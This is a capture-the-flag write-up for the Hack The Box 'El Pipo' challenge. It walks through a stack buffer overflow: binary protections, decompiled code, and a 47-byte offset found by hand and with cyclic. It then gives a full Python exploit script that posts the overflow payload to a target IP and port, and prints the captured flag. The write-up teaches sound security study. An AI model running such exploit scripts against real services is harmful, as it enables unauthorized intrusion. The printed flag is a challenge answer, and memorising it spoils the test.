---
title: "El Pipo 👻 - Buffer Overflow Exploit Writeup"
tags: [HTB, binary exploitation, stack overflow, pwn]
---

# El Pipo 👻

![Category](https://img.shields.io/badge/category-Pwn-orange)
![Difficulty](https://img.shields.io/badge/difficulty-Easy-blue)
![Platform](https://img.shields.io/badge/platform-Linux-blue)
![HTB](https://img.shields.io/badge/HTB-Challenge-green)

> An ancient spirit, El Pipo, has taken control of this place. Face your fears and try to drive it away with your most vicious scream!

El Pipo, a not-so-scary ghost, dares you to make him scream. Can you break the silence and reveal the hidden flag?

## 📚 Table of Contents
- [Binary Protections Analysis 🛡️](#binary-protections-analysis-️)
- [Program Behavior 📟](#program-behavior-)
- [Reverse Engineering 🔍](#reverse-engineering-)
- [Finding the Offset 🎯](#finding-the-offset-)
- [Exploitation Strategy 💣](#exploitation-strategy-)
- [Full Exploit Script 🧨](#full-exploit-script-)
- [Exploitation Result ✅](#exploitation-result-)
- [Conclusion 🧾](#conclusion-)

## Binary Protections Analysis 🛡️

We begin with a `checksec` on the binary:

![Checksec](https://github.com/user-attachments/assets/809aea46-ce9d-456a-a32d-585c14693ae2)

```
Arch:     amd64-64-little
RELRO:    Full RELRO
Stack:    No canary found
NX:       NX enabled
PIE:      PIE enabled
```

## Program Behavior 📟

When we run the binary, it reads input via `read()` and checks a variable:

![Ghidra main](https://github.com/user-attachments/assets/18aaa356-87c8-4ab0-a1cf-a0f73f8523f8)

```c
char local_9 = 1;
read(0, &buffer, 0x40);
if (local_9 == 1) {
    puts("Not scary enough.. Boo! :(");
} else {
    read_flag();
}
```

The flag is only printed if `local_9` is overwritten with any value ≠ 1.

## Reverse Engineering 🔍

In Ghidra or GDB disassembly, we observe:
- The buffer starts at `[rbp - 0x30]`
- `local_9` is located at `[rbp - 0x1]`
- `read()` reads **64 bytes** into a **48-byte** buffer

This allows us to overflow and overwrite `local_9`.

## Finding the Offset 🎯

We need to find the exact number of bytes required to reach and overwrite `local_9`.

### Approach 1: Manual Stack Analysis

From disassembly:
- Buffer starts at `[rbp - 0x30]`
- `local_9` is at `[rbp - 0x1]`

![GDB debug](https://github.com/user-attachments/assets/d0bd9343-a562-470e-9828-601644650e17)

![Distance](https://github.com/user-attachments/assets/34fad339-5dd4-4601-a508-9f21b083259a)

Distance = `0x30 - 0x1 = 0x2f = 47` bytes  
✅ **We must write 47 bytes to reach `local_9`**

### Approach 2: Using `cyclic` + pwndbg

We generate a unique cyclic pattern of 100 bytes and run the binary with it.

![Cyclic generation](https://github.com/user-attachments/assets/0be47dae-983a-4fee-82fa-160e0147c3ca)

Upon crash, we check the stack and use:

![RBP](https://github.com/user-attachments/assets/2a6cc1fd-decc-48c3-b1bf-cb65a9e85e66)

![Distance cyclic](https://github.com/user-attachments/assets/bf07a2bd-b46a-43ad-b977-99229546f73b)

```gdb
cyclic -l gaaaaaaa
Found at offset 48
```

Since the last value is written at offset 47, we know the **overwrite occurs at byte 47**.

✅ Final conclusion: 47 bytes are required to reach and overwrite `local_9`.

## Exploitation Strategy 💣

Our goal is to overwrite `local_9` with a value ≠ 1.

The value `'A'` (0x41) works perfectly.

Payload:
```python
offset = 47
payload = b"A" * offset + b"A"
```

This sets `local_9` to 0x41, bypassing the check.

But in this challenge, we don't directly interact with the binary with netcat; This is on a website:

![Website](https://github.com/user-attachments/assets/8ec42afd-90af-473d-b321-47a41df070d9)

## Full Exploit Script 🧨

```python
#!/usr/bin/env python3
import requests
import argparse

def build_payload():
    # We need 47 bytes to reach local_9
    offset = 47
    return "A" * offset + "A"

def send_payload(ip, port, payload):
    url = f"http://{ip}:{port}/process"
    data = { "userInput": payload }
    response = requests.post(url, json=data)
    return response

def main():
    parser = argparse.ArgumentParser(description="Exploit for El Pipo - HTB Web + Pwn challenge")
    parser.add_argument("ip", help="Target IP address")
    parser.add_argument("port", help="Target port")
    args = parser.parse_args()

    payload = build_payload()
    response = send_payload(args.ip, args.port, payload)

    print("[+] Sent payload:", payload)
    print("[+] Server response:")
    print(response.text)

if __name__ == "__main__":
    main()
```

## Exploitation Result ✅

![Flag](https://github.com/user-attachments/assets/d2e8190f-fea7-4bd3-b5bc-987e1dcd784c)

```
[+] Server response:
HTB{3l_p1p0v3rfl0w_w1th_w3b}
```

We successfully reached and triggered `read_flag()`.

## Conclusion 🧾

This was a classic stack-based buffer overflow challenge:

- We used stack layout and offset calculation to find the exact overwrite point
- Exploitation succeeded by crafting a precise 47-byte payload
- A good demonstration of how buffer overflows can manipulate control flow, even without touching return addresses

🔙 [Back to Challenge Writeups](../../)
